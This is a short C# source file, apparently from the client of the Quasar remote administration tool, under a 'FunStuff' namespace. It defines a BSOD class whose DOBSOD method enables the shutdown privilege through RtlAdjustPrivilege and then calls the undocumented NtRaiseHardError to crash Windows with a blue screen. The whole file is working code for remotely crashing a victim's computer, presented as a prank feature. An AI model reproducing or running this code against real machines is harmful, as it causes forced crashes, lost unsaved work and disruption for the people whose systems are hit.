using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Quasar.Client.FunStuff
{
    public static class BSOD
    {
        [DllImport("ntdll.dll")]
        private static extern uint RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled);
        [DllImport("ntdll.dll")]
        private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
        public

        static unsafe void DOBSOD()
        {
            bool t1;
            RtlAdjustPrivilege(19, true, false, out t1);
            uint resp;
            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out resp);
        }
    }
}
